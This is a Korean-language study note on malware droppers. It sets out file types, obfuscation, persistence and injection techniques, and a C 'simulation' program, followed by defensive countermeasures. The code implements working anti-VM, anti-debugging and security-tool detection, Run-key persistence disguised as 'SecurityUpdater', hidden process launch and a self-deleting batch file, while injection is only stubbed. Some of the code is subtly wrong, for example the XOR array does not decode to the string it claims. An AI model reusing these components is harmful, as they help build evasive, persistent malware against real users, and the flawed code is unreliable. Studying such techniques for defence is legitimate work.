## Context

- **Tactic:** Stealth Engineering
- **Technique:** Dropper Simulation & In-Memory Execution Models
- **Procedure:** Simulate dropper behavior including persistence, obfuscation, anti-analysis, and payload deployment
## Core Idea

### Dropper 파일 유형별 특징과 제약

Dropper는 다양한 형식으로 존재하며, 공격 시나리오에 따라 파일 유형이 결정된다.
각 파일 형식은 탐지 회피, 실행 방식, 지속성 유지 등의 측면에서 서로 다른 특징과 제약이 있다.

| **파일 유형**       | **확장자 예시**                           | **특징**                               | **제약사항**                           |
| --------------- | ------------------------------------ | ------------------------------------ | ---------------------------------- |
| **실행 파일**       | .exe, .dll, .bin                     | 독립적으로 실행 가능하며, 관리자 권한 상승이 용이함        | 보안 솔루션에 의해 쉽게 탐지될 가능성이 있음          |
| **스크립트 기반**     | .js, .vbs, .ps1                      | 실행 파일 없이 코드만으로 동작 가능하며, 난독화가 용이함     | 실행 환경에 따라 보안 정책에 의해 차단될 수 있음       |
| **문서 기반**       | .docm, .ink, .xlsm(매크로)              | 사회공학적 공격에 활용 가능하며, 사용자의 실행을 유도할 수 있음 | 보안 패치 적용 환경에서는 기본적으로 매크로 실행이 비활성화됨 |
| **압축 및 패키징 파일** | .zip, .rar, .iso                     | 탐지를 우회하기 위해 페이로드를 압축하여 배포할 수 있음      | 사용자가 직접 압축 해제해야 하며, 실행까지의 과정이 추가됨  |

### Dropper 주요 기능 분석

#### 1. 페이로드 포함 및 실행 기법
Dropper는 악성 페이로드를 포함하고 있으며, 실행 방식에 따라 다양한 기법을 사용한다.

- **디스크 드롭 방식**
    - Dropper 내부에 포함된 페이로드를 디스크에 저장한 후 실행한다.
    - `CreateFileA` → `WriteFile` → `CreateProcessA/W` 등의 API를 호출하여 페이로드를 실행한다.
- **메모리 로딩 방식**
    - 디스크에 흔적을 남기지 않고, 페이로드를 메모리에 직접 로드하여 실행한다.
    - `Reflective DLL Injection`, `Process Hollowing`, `Process Injection` 등의 기법을 활용하여 메모리에서 직접 실행한다.

#### 2. 난독화 및 패킹 기법
Dropper는 탐지를 우회하기 위해 코드와 데이터를 변형하는 다양한 기법을 사용한다.

- **난독화 (Obfuscation)**
    - 문자열을 Base64, XOR, AES 등의 암호화 방식으로 변환하여 탐지를 어렵게 한다.
    - API 호출을 난독화하여 보안 솔루션이 쉽게 탐지하지 못하도록 한다.
    - Control Flow Flattening(제어 흐름 난독화) 기법을 활용하여 실행 흐름을 복잡하게 만든다.
- **패킹 (Packing)**
    - UPX, Themida, Enigma Protector 등의 패커를 사용하여 실행 파일을 압축하고 암호화한다.
    - 정적 분석을 어렵게 만들고, 실행 시 메모리에서 복호화된 후 실행되도록 한다.
    - 코드 가상화(Code Virtualization)를 활용하여 리버스 엔지니어링을 어렵게 만든다.

#### 3. 실행 방식
Dropper는 실행 후 탐지를 피하고 지속적으로 동작하기 위해 다양한 기법을 사용한다.

- **자기 삭제 (Self-Deletion)**
    - 실행 후 자기 자신을 삭제하여 포렌식 분석을 어렵게 한다.
    - `cmd /c del` 명령어나 `MoveFileExA` API를 사용하여 파일을 삭제하거나 재부팅 후 제거되도록 예약한다.
- **지속성 유지 (Persistence)**
    - 감염된 시스템에서 재부팅 후에도 실행되도록 설정한다.
    - `RegSetValueExA/W` API를 이용하여 레지스트리에 등록하고, 시작 프로그램으로 실행되도록 한다.
    - `schtasks /create` 명령어를 사용하여 작업 스케줄러(Task Scheduler)에 등록한다.
    - Startup 폴더에 드로퍼를 복사하여 자동 실행되도록 설정한다.

#### 4. 페이로드 실행 기법
Dropper는 단순 실행 외에도 다양한 기술을 활용해 페이로드를 실행한다.

- **디스크 실행**
    - `CreateProcessA/W`, `ShellExecute` API를 호출하여 페이로드를 실행한다.
    - 드롭한 페이로드를 독립적인 프로세스로 실행하거나, 추가적인 프로세스 생성 없이 현재 프로세스에서 실행할 수도 있다.
- **프로세스 인젝션 (Process Injection)**
    - `VirtualAllocEx`, `WriteProcessMemory`, `CreateRemoteThread` 등의 API를 활용하여 다른 프로세스에 페이로드를 삽입하고 실행한다.
    - Process Hollowing, AtomBombing 등의 고급 인젝션 기법을 활용할 수 있다.
- **메모리 내 로딩 (Reflective Execution)**
    - Reflective DLL Injection을 통해 디스크에 저장하지 않고 DLL을 메모리에 로드하여 실행한다.
    - `NtMapViewOfSection`, `NtAllocateVirtualMemory` 등의 API를 활용하여 메모리에 직접 페이로드를 올리고 실행한다.

## Code / Experiment

```c
// =======================================================
// WARNING AND DISCLAIMER:
// =======================================================
// This code is created SOLELY for security research and educational purposes.
// Running this code in any non-isolated environment may violate computer fraud laws.
// REQUIREMENTS:
// - Execute ONLY in isolated virtual environments
// - This simulation contains potentially dangerous techniques 
// - NOT for production use or deployment on any real system
// - Ensure proper authorization before any security testing
// =======================================================

#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <time.h>
#include <psapi.h>

// Global variables for logging
FILE* g_logFile = NULL;
BOOL g_isVirtualEnvironment = FALSE;

// ==========================================
// LOGGING AND SAFETY FUNCTIONS
// ==========================================

// Initialize logging system
BOOL initialize_logging() {
    char logPath[MAX_PATH];
    GetTempPathA(MAX_PATH, logPath);
    strcat(logPath, "malware_sim_log.txt");
    
    g_logFile = fopen(logPath, "w");
    if (g_logFile == NULL) {
        printf("[ERROR] Failed to create log file\n");
        return FALSE;
    }
    
    fprintf(g_logFile, "=== MALWARE SIMULATION LOG ===\n");
    fprintf(g_logFile, "Started at: %s\n", _strdate(logPath));
    fprintf(g_logFile, "This is an educational simulation only\n");
    fprintf(g_logFile, "==============================\n\n");
    fflush(g_logFile);
    
    printf("[INFO] Logging initialized at %s\n", logPath);
    return TRUE;
}

// Log message to file and optionally to console
void log_message(const char* type, const char* message, BOOL console) {
    if (g_logFile) {
        fprintf(g_logFile, "[%s] %s\n", type, message);
        fflush(g_logFile);
    }
    
    if (console) {
        printf("[%s] %s\n", type, message);
    }
}

// Close logging
void close_logging() {
    if (g_logFile) {
        fprintf(g_logFile, "\n=== SIMULATION ENDED ===\n");
        fclose(g_logFile);
        g_logFile = NULL;
    }
}

// ==========================================
// ANTI-ANALYSIS DETECTION TECHNIQUES
// ==========================================

// Basic VM detection (for educational purposes)
// References common VM-related artifacts
BOOL detect_virtual_environment() {
    BOOL result = FALSE;
    char message[256];

    // Method 1: Check for common VM processes
    PROCESSENTRY32 pe32 = { sizeof(PROCESSENTRY32) };
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        if (Process32First(hSnapshot, &pe32)) {
            do {
                if (!_stricmp(pe32.szExeFile, "vmtoolsd.exe") || 
                    !_stricmp(pe32.szExeFile, "VBoxService.exe")) {
                    sprintf(message, "VM-related process detected: %s", pe32.szExeFile);
                    log_message("VM-DETECT", message, TRUE);
                    result = TRUE;
                }
            } while (Process32Next(hSnapshot, &pe32));
        }
        CloseHandle(hSnapshot);
    }

    // Method 2: Check for VM-related registry keys
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0", 
                     0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char szBuffer[256] = {0};
        DWORD dwSize = sizeof(szBuffer);
        
        if (RegQueryValueExA(hKey, "Identifier", NULL, NULL, (BYTE*)szBuffer, &dwSize) == ERROR_SUCCESS) {
            if (strstr(szBuffer, "VBOX") || 
                strstr(szBuffer, "VMWARE") || 
                strstr(szBuffer, "QEMU")) {
                sprintf(message, "VM-related hardware identifier: %s", szBuffer);
                log_message("VM-DETECT", message, TRUE);
                result = TRUE;
            }
        }
        RegCloseKey(hKey);
    }

    // Method 3: Check Windows Management Instrumentation (WMI)
    // Note: Simplified example; actual implementation would use WMI queries

    if (!result) {
        log_message("VM-DETECT", "No virtual environment detected. THIS CODE SHOULD ONLY RUN IN A VM!", TRUE);
    }
    
    return result;
}

// Anti-debugging check
BOOL check_for_debugger() {
    // Method 1: IsDebuggerPresent API
    if (IsDebuggerPresent()) {
        log_message("ANTI-DEBUG", "IsDebuggerPresent() returned TRUE", TRUE);
        return TRUE;
    }
    
    // Method 2: CheckRemoteDebuggerPresent API
    BOOL debuggerPresent = FALSE;
    if (CheckRemoteDebuggerPresent(GetCurrentProcess(), &debuggerPresent) && debuggerPresent) {
        log_message("ANTI-DEBUG", "CheckRemoteDebuggerPresent() detected a debugger", TRUE);
        return TRUE;
    }
    
    // Method 3: NtGlobalFlag check
    PVOID pPeb = (PVOID)__readgsqword(0x60);
    DWORD NtGlobalFlag = *(PDWORD)((PBYTE)pPeb + 0xBC);
    if (NtGlobalFlag & 0x70) {  // Check for FLG_HEAP_ENABLE_TAIL_CHECK, etc.
        log_message("ANTI-DEBUG", "NtGlobalFlag indicates a debugger", TRUE);
        return TRUE;
    }
    
    log_message("ANTI-DEBUG", "No debugger detected", TRUE);
    return FALSE;
}

// Detect security tools by checking running processes
BOOL detect_security_tools() {
    const char* securityTools[] = {
        "wireshark.exe", "procmon.exe", "procexp.exe", "ollydbg.exe",
        "ida.exe", "ida64.exe", "x64dbg.exe", "protection_agent.exe",
        "epdump.exe", "dumpcap.exe"
    };
    
    PROCESSENTRY32 pe32 = { sizeof(PROCESSENTRY32) };
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    BOOL found = FALSE;
    char message[256];
    
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        if (Process32First(hSnapshot, &pe32)) {
            do {
                for (int i = 0; i < sizeof(securityTools) / sizeof(securityTools[0]); i++) {
                    if (!_stricmp(pe32.szExeFile, securityTools[i])) {
                        sprintf(message, "Security tool detected: %s", pe32.szExeFile);
                        log_message("SEC-TOOL", message, TRUE);
                        found = TRUE;
                    }
                }
            } while (Process32Next(hSnapshot, &pe32));
        }
        CloseHandle(hSnapshot);
    } else {
        log_message("ERROR", "Failed to create process snapshot", TRUE);
    }
    
    if (!found) {
        log_message("SEC-TOOL", "No security tools detected", TRUE);
    }
    
    return found;
}

// Time-based evasion technique
void timing_check() {
    // Record start time
    DWORD start_time = GetTickCount();
    
    // Sleep for a short period
    Sleep(10);
    
    // Check elapsed time
    DWORD elapsed = GetTickCount() - start_time;
    
    // If elapsed time is significantly more than expected, might be debugging/emulation
    if (elapsed > 50) {
        char message[256];
        sprintf(message, "Timing anomaly detected. Expected ~10ms, got %lums", elapsed);
        log_message("EVASION", message, TRUE);
    }
}

// ==========================================
// OBFUSCATION TECHNIQUES
// ==========================================

// XOR string obfuscation
void xor_crypt(char* data, size_t len, char key) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= key;
    }
    log_message("OBFUSCATION", "XOR decryption performed", TRUE);
}

// Multi-layer string obfuscation
void multi_layer_decrypt(char* data, size_t len) {
    // Layer 1: XOR with static key
    xor_crypt(data, len, 0x5A);
    
    // Layer 2: Byte reversal (for demonstration)
    for (size_t i = 0; i < len / 2; i++) {
        char temp = data[i];
        data[i] = data[len - i - 1];
        data[len - i - 1] = temp;
    }
    
    // Layer 3: Bit rotation
    for (size_t i = 0; i < len; i++) {
        data[i] = (data[i] << 4) | (data[i] >> 4);
    }
    
    log_message("OBFUSCATION", "Multi-layer decryption completed", TRUE);
}

// ==========================================
// PERSISTENCE TECHNIQUES
// ==========================================

// Registry run key persistence
BOOL set_registry_persistence(const char* path) {
    HKEY hKey;
    LSTATUS status;
    char message[512];
    
    // Open the Run key
    status = RegOpenKeyExA(HKEY_CURRENT_USER, 
                         "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
                         0, KEY_SET_VALUE, &hKey);
    
    if (status != ERROR_SUCCESS) {
        sprintf(message, "Failed to open registry key for persistence. Error: %ld", status);
        log_message("ERROR", message, TRUE);
        return FALSE;
    }
    
    // Set the value
    status = RegSetValueExA(hKey, "SecurityUpdater", 0, REG_SZ, 
                          (BYTE*)path, strlen(path) + 1);
    
    if (status != ERROR_SUCCESS) {
        sprintf(message, "Failed to set registry value. Error: %ld", status);
        log_message("ERROR", message, TRUE);
        RegCloseKey(hKey);
        return FALSE;
    }
    
    RegCloseKey(hKey);
    
    sprintf(message, "Registry persistence set: %s", path);
    log_message("PERSISTENCE", message, TRUE);
    return TRUE;
}

// Scheduled task persistence (simulated)
BOOL simulate_scheduled_task_persistence(const char* path) {
    char message[512];
    sprintf(message, "Would create scheduled task for: %s", path);
    log_message("PERSISTENCE", message, TRUE);
    
    // In a real implementation, this would use the Task Scheduler API
    log_message("PERSISTENCE", "Task name: SecurityScanner, Run daily at startup", TRUE);
    return TRUE;
}

// Startup folder persistence
BOOL set_startup_folder_persistence(const char* originalPath) {
    char startupFolder[MAX_PATH];
    char newPath[MAX_PATH];
    char message[512];
    BOOL result = FALSE;
    
    // Get the Startup folder path
    if (SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startupFolder) != S_OK) {
        log_message("ERROR", "Failed to get Startup folder path", TRUE);
        return FALSE;
    }
    
    // Create the new path
    sprintf(newPath, "%s\\SecurityUpdater.lnk", startupFolder);
    
    // In a real implementation, this would create a shortcut using IShellLink
    sprintf(message, "Would create shortcut at: %s pointing to: %s", newPath, originalPath);
    log_message("PERSISTENCE", message, TRUE);
    
    return TRUE;
}

// ==========================================
// PAYLOAD HANDLING
// ==========================================

// Drop file to disk with proper error handling
BOOL drop_file(const char* path, const BYTE* data, DWORD size) {
    HANDLE hFile;
    DWORD written;
    BOOL result = FALSE;
    char message[512];
    
    // Create the file
    hFile = CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 
                       FILE_ATTRIBUTE_NORMAL, NULL);
    
    if (hFile == INVALID_HANDLE_VALUE) {
        sprintf(message, "Failed to create file: %s. Error: %ld", path, GetLastError());
        log_message("ERROR", message, TRUE);
        return FALSE;
    }
    
    // Write the data
    if (!WriteFile(hFile, data, size, &written, NULL) || written != size) {
        sprintf(message, "Failed to write file data. Error: %ld", GetLastError());
        log_message("ERROR", message, TRUE);
    } else {
        sprintf(message, "Successfully dropped file: %s (%ld bytes)", path, written);
        log_message("PAYLOAD", message, TRUE);
        result = TRUE;
    }
    
    CloseHandle(hFile);
    return result;
}

// Execute a dropped file
BOOL execute_dropped_file(const char* path) {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = {0};
    BOOL result;
    char message[512];
    
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    // Create process
    result = CreateProcessA(NULL, (LPSTR)path, NULL, NULL, FALSE, 
                          CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    
    if (!result) {
        sprintf(message, "Failed to execute: %s. Error: %ld", path, GetLastError());
        log_message("ERROR", message, TRUE);
        return FALSE;
    }
    
    sprintf(message, "Successfully executed: %s (PID: %ld)", path, pi.dwProcessId);
    log_message("PAYLOAD", message, TRUE);
    
    // Close handles
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    
    return TRUE;
}

// ==========================================
// PROCESS INJECTION TECHNIQUES
// ==========================================

// Find a process by name
DWORD find_process_by_name(const char* processName) {
    DWORD pid = 0;
    PROCESSENTRY32 pe32 = { sizeof(pe32) };
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        log_message("ERROR", "Failed to create process snapshot", TRUE);
        return 0;
    }
    
    if (Process32First(hSnapshot, &pe32)) {
        do {
            if (_stricmp(pe32.szExeFile, processName) == 0) {
                pid = pe32.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnapshot, &pe32));
    }
    
    CloseHandle(hSnapshot);
    return pid;
}

// Classic DLL injection (simulated for educational purposes)
BOOL simulate_dll_injection(DWORD targetPid, const char* dllPath) {
    char message[512];
    
    if (targetPid == 0) {
        log_message("ERROR", "Invalid target PID for DLL injection", TRUE);
        return FALSE;
    }
    
    // In a real implementation, this would:
    // 1. Open the target process with PROCESS_VM_WRITE, PROCESS_VM_OPERATION, PROCESS_CREATE_THREAD
    // 2. Allocate memory in the target process using VirtualAllocEx
    // 3. Write the DLL path to the allocated memory using WriteProcessMemory
    // 4. Get the address of LoadLibraryA using GetProcAddress
    // 5. Create a remote thread in the target process using CreateRemoteThread
    
    sprintf(message, "[SIMULATION] Would inject %s into process ID %ld", dllPath, targetPid);
    log_message("INJECTION", message, TRUE);
    
    log_message("INJECTION", "Steps in real malware:", TRUE);
    log_message("INJECTION", "1. Open target process with VirtualAllocEx", FALSE);
    log_message("INJECTION", "2. Allocate memory in target process", FALSE);
    log_message("INJECTION", "3. Write DLL path to allocated memory", FALSE);
    log_message("INJECTION", "4. Create remote thread pointing to LoadLibraryA", FALSE);
    
    return TRUE;
}

// Process hollowing simulation (for educational purposes)
BOOL simulate_process_hollowing(const char* targetPath, const char* replacementPath) {
    char message[512];
    
    // In a real implementation, this would:
    // 1. Create a new process in suspended state
    // 2. Unmap the process's image from memory
    // 3. Allocate memory and write the replacement executable
    // 4. Set the entry point and resume the thread
    
    sprintf(message, "[SIMULATION] Would hollow %s and replace with %s", targetPath, replacementPath);
    log_message("HOLLOWING", message, TRUE);
    
    log_message("HOLLOWING", "Steps in real malware:", TRUE);
    log_message("HOLLOWING", "1. Create suspended process", FALSE);
    log_message("HOLLOWING", "2. Get context of main thread", FALSE);
    log_message("HOLLOWING", "3. Read PEB to find image base", FALSE);
    log_message("HOLLOWING", "4. Unmap original executable", FALSE);
    log_message("HOLLOWING", "5. Map new executable into process", FALSE);
    log_message("HOLLOWING", "6. Update entry point and resume thread", FALSE);
    
    return TRUE;
}

// APC Injection simulation (for educational purposes)
BOOL simulate_apc_injection(DWORD targetPid) {
    char message[512];
    
    if (targetPid == 0) {
        log_message("ERROR", "Invalid target PID for APC injection", TRUE);
        return FALSE;
    }
    
    // In a real implementation, this would:
    // 1. Open the target process
    // 2. Allocate memory for shellcode
    // 3. Write shellcode to memory
    // 4. Find threads in the target process
    // 5. Queue an APC to each thread
    
    sprintf(message, "[SIMULATION] Would perform APC injection into process ID %ld", targetPid);
    log_message("INJECTION", message, TRUE);
    
    log_message("APC-INJECTION", "Steps in real malware:", TRUE);
    log_message("APC-INJECTION", "1. Allocate memory in target process", FALSE);
    log_message("APC-INJECTION", "2. Write shellcode to allocated memory", FALSE);
    log_message("APC-INJECTION", "3. Enumerate threads in target process", FALSE);
    log_message("APC-INJECTION", "4. Queue APCs to threads using NtQueueApcThread", FALSE);
    
    return TRUE;
}

// ==========================================
// CLEANUP FUNCTIONS
// ==========================================

// Self-deletion function
BOOL self_delete() {
    char szModuleName[MAX_PATH];
    char szCmd[MAX_PATH];
    BOOL result = FALSE;
    
    if (GetModuleFileNameA(NULL, szModuleName, MAX_PATH)) {
        // Create a batch file to delete the executable after it exits
        sprintf(szCmd, "@echo off\n:loop\ndel \"%s\"\nif exist \"%s\" goto loop\ndel \"%%~f0\"", 
               szModuleName, szModuleName);
        
        char batchPath[MAX_PATH];
        GetTempPathA(MAX_PATH, batchPath);
        strcat(batchPath, "cleanup.bat");
        
        HANDLE hFile = CreateFileA(batchPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 
                                 FILE_ATTRIBUTE_NORMAL, NULL);
        
        if (hFile != INVALID_HANDLE_VALUE) {
            DWORD written;
            WriteFile(hFile, szCmd, strlen(szCmd), &written, NULL);
            CloseHandle(hFile);
            
            // Execute the batch file
            STARTUPINFOA si = { sizeof(si) };
            PROCESS_INFORMATION pi;
            si.dwFlags = STARTF_USESHOWWINDOW;
            si.wShowWindow = SW_HIDE;
            
            char executeCmd[MAX_PATH + 20];
            sprintf(executeCmd, "cmd.exe /c \"%s\"", batchPath);
            
            if (CreateProcessA(NULL, executeCmd, NULL, NULL, FALSE, 
                             CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
                result = TRUE;
                
                log_message("CLEANUP", "Self-deletion scheduled", TRUE);
            } else {
                log_message("ERROR", "Failed to start cleanup process", TRUE);
            }
        } else {
            log_message("ERROR", "Failed to create cleanup batch file", TRUE);
        }
    } else {
        log_message("ERROR", "Failed to get module filename", TRUE);
    }
    
    return result;
}

// Remove persistence
BOOL remove_persistence() {
    // Remove registry run key
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, 
                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
                    0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegDeleteValueA(hKey, "SecurityUpdater");
        RegCloseKey(hKey);
        log_message("CLEANUP", "Registry persistence removed", TRUE);
        return TRUE;
    } else {
        log_message("ERROR", "Failed to open registry for cleanup", TRUE);
        return FALSE;
    }
}

// ==========================================
// MAIN FUNCTION
// ==========================================

int main(int argc, char* argv[]) {
    char szModuleName[MAX_PATH] = {0};
    
    // Initialize logging
    if (!initialize_logging()) {
        printf("[CRITICAL] Logging initialization failed\n");
        return 1;
    }
    
    // Log basic system information
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    
    char sysInfoStr[256];
    sprintf(sysInfoStr, "Processor architecture: %d, Processors: %d", 
           sysInfo.wProcessorArchitecture, sysInfo.dwNumberOfProcessors);
    log_message("SYSTEM", sysInfoStr, TRUE);
    
    // Get current module path
    if (!GetModuleFileNameA(NULL, szModuleName, MAX_PATH)) {
        log_message("ERROR", "Failed to get module path", TRUE);
        close_logging();
        return 1;
    }
    
    log_message("INFO", "Starting malware simulation for educational purposes", TRUE);
    log_message("MODULE", szModuleName, TRUE);
    
    // Perform environment checks
    g_isVirtualEnvironment = detect_virtual_environment();
    BOOL debuggerDetected = check_for_debugger();
    BOOL securityToolsDetected = detect_security_tools();
    
    // TEST: Only proceed if in a VM or if safety override is provided
    if (!g_isVirtualEnvironment && argc < 2) {
        log_message("CRITICAL", "Not running in a virtual environment. Aborting for safety.", TRUE);
        log_message("CRITICAL", "This code should ONLY be run in a controlled VM for research!", TRUE);
        close_logging();
        return 1;
    }
    
    // Perform timing check
    timing_check();
    
    // Demo string obfuscation
    // Original string was "MalwareResearchSample" encrypted with XOR key 0x5A
    char encrypted_str[] = {0x17, 0x27, 0x34, 0x37, 0x27, 0x28, 0x25, 0x12, 
                           0x25, 0x33, 0x25, 0x27, 0x28, 0x23, 0x20, 0x13, 
                           0x27, 0x36, 0x30, 0x34, 0x25, 0x00};
    
    xor_crypt(encrypted_str, strlen(encrypted_str), 0x5A);
    log_message("DEMO", encrypted_str, TRUE);
    
    // Demo multi-layer obfuscation
    char multi_encrypted[] = {0x72, 0x15, 0x60, 0x71, 0x66, 0x17, 0x60, 0x76, 0x00};
    multi_layer_decrypt(multi_encrypted, strlen(multi_encrypted));
    log_message("DEMO", multi_encrypted, TRUE);
    
    // Set up persistence techniques (for educational demonstration)
    log_message("PERSISTENCE", "Demonstrating persistence techniques:", TRUE);
    set_registry_persistence(szModuleName);
    simulate_scheduled_task_persistence(szModuleName);
    set_startup_folder_persistence(szModuleName);
    
    // Create and drop payload (for educational demonstration)
    // Note: This is a harmless dummy payload
    BYTE dummy_payload[] = { 
        0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 
        0x04, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0x00, 0x00 
    };
    
    char payloadPath[MAX_PATH];
    GetTempPathA(MAX_PATH, payloadPath);
    strcat(payloadPath, "research_payload.bin");
    
    if (drop_file(payloadPath, dummy_payload, sizeof(dummy_payload))) {
        log_message("PAYLOAD", "Dummy payload dropped successfully", TRUE);
        
        // Normally we would execute it, but we'll just simulate for safety
        log_message("PAYLOAD", "Simulating payload execution", TRUE);
    }
    
    // Demo process injection techniques (all simulated for safety)
    log_message("INJECTION", "Demonstrating process injection techniques:", TRUE);
    
    // Find a potential target process (notepad.exe)
    DWORD targetPid = find_process_by_name("notepad.exe");
    if (targetPid) {
        log_message("TARGET", "Found notepad.exe process", TRUE);
        
        // Simulate various injection techniques
        simulate_dll_injection(targetPid, "C:\\temp\\dummy.dll");
        simulate_apc_injection(targetPid);
    } else {
        log_message("INFO", "No target process found for injection demo", TRUE);
        
        // Could launch a process for demonstration, but we'll skip for safety
        log_message("INFO", "You can open notepad.exe to see the injection simulation", TRUE);
    }
    
    // Demonstrate process hollowing with common target
    simulate_process_hollowing("C:\\Windows\\System32\\svchost.exe", payloadPath);
    
    // Clean up our traces if not in debug mode
    if (!debuggerDetected) {
        log_message("CLEANUP", "Performing cleanup...", TRUE);
        
        // Remove dropped files
        if (DeleteFileA(payloadPath)) {
            log_message("CLEANUP", "Removed payload file", TRUE);
        } else {
            log_message("ERROR", "Failed to remove payload file", TRUE);
        }
        
        // Remove persistence
        remove_persistence();
        
        // Normally we'd self-delete, but we'll just simulate
        log_message("CLEANUP", "Self-deletion mechanism demonstrated but not executed", TRUE);
    } else {
        log_message("CLEANUP", "Skipping cleanup due to debugger presence", TRUE);
    }
    
    log_message("INFO", "Malware simulation completed", TRUE);
    close_logging();
    
    return 0;
}
``` 

## Note
### Dropper의 보안 위험성과 대응 방안
Dropper는 탐지를 회피하면서도 악성 페이로드를 실행할 수 있는 다양한 기능을 갖추고 있다.

|**보안 위험 요소**|**설명**|**대응 방안**|
|---|---|---|
|**디스크 기반 페이로드 저장**|악성 파일이 디스크에 남아 탐지될 가능성|정적 분석(YARA, PE-sieve) 활용 스캔|
|**메모리 기반 실행(파일리스)**|파일 없이 실행되므로 정적 분석이 어려움|API 호출 모니터링 및 동적 분석을 통한 탐지|
|**난독화 및 패킹**|보안 솔루션의 탐지를 우회하기 위해 코드 변조|실행 중 메모리 덤프 분석 후, 원래 코드 복원|
|**Persistence 기법**|시스템 설정을 변경하여 지속적인 실행을 보장|Autorun 레지스트리, 작업 스케줄러 모니터링|
|**자기 삭제 기법**|실행 후 파일이 삭제되어 증거 확보 어려움|실행 중 프로세스를 추적하고 메모리 덤프 확보|

### Dropper Payload 예시
- **1. 원격 접속 트로이 목마(RAT, Remote Access Trojan)**
	- 예시: Agent Tesla, njRAT, AsyncRAT
	- 목적: 감염된 시스템을 원격으로 제어 및 감시
	- 기능: 키로깅, 원격 데스크톱, 웹캠 접근, 파일 업로드 및 다운로드
- **2. 랜섬웨어(Ransomware)**
	- 예시: Conti, LockBit, Ryuk, REvil
	- 목적: 파일 암호화를 통한 데이터 인질
	- 기능: 시스템 파일 암호화, 암호화폐 몸값 요구, 시스템 파괴 기능
- **3. 정보 탈취형 악성코드(Infostealer)**
	- 예시: RedLine, Vidar, Raccoon
	- 목적: 브라우저 비밀번호, 쿠키, 금융 정보, 로그인 세션 탈취
	- 기능: 감염 후 수집한 민감 정보를 원격 서버로 전송
- **4. 암호화폐 채굴 악성코드(Coin Miner)**
	- 예시: XMRig 기반 Monero Miner
	- 목적: 피해자 시스템 자원을 이용한 암호화폐 채굴
	- 기능: 높은 CPU/GPU 사용, 은밀한 자원 점유 및 장기간 동작
- **5. 백도어(Backdoor)**
	- **예시**: **Cobalt Strike Beacon**, **Metasploit Meterpreter**
	- 목적: 시스템의 지속적 접근 및 확장된 공격 단계 준비
	- 기능: 추가 악성 파일 다운로드, 명령 및 제어(C2) 서버 통신 유지, 공격 거점 제공

#### 실제 악성 페이로드 특징 및 고려사항
- 일반적으로 **PE 실행파일(EXE, DLL)** 형태로 사용
- Dropper는 페이로드를 디스크에 바로 저장하거나 메모리에서 직접 실행
- 실전 환경에서는 페이로드가 고도로 난독화 및 패킹되어 있음
- 보안 솔루션 회피 및 포렌식 증거 확보 방지를 위한 기법(예: 메모리 로딩, 자기 삭제) 활용